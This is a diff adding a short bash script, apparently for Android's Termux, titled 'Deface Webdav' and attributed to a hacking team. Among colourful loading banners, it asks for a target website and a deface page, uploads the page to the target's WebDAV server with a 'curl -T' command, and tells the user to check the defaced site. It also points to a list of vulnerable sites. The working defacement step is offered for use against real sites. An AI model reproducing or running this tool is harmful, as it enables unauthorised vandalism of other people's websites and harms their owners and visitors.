@@ -1,0 +1,43 @@
+
+
+#ngapain lu nyet, record gua sumpahin mati diember#
+
+clear
+sleep 1
+echo "♥ LOADING ♥" | lolcat
+sleep 3
+clear
+figlet Wellcome | lolcat
+sleep 2
+clear
+echo "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
+
+                 [ Deface Webdav ]
+
+♥ Coded   : BLANK
+♥ Team    : sixtysix hackteam
+♥ Github  : https://github.com/sixtysix-Team
+♥ Youtube : hack 606
+
+∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+sleep 1
+echo "♥ Sabar bosss..." | lolcat
+sleep 3
+echo "♥ Jika Belum Punya Web Vuln Ambil di webvuln-01.txt" | lolcat
+sleep 2
+
+echo "♥ Website Target : " $target |lolcat
+read target
+echo "♥ LOADING..." | lolcat
+sleep 2
+echo "♥ Masukin Scriptnya (croot.html) : " $sc |lolcat
+read sc
+curl -T /storage/emulated/0/$sc $target
+echo "♥ Cek Websitenya croot.html" | lolcat
+sleep 2
+echo "♥ Croot... " | lolcat
+sleep 20
+clear
+echo "subscribe my chanel HACK 606" | lolcat
+sleep 5
+clear
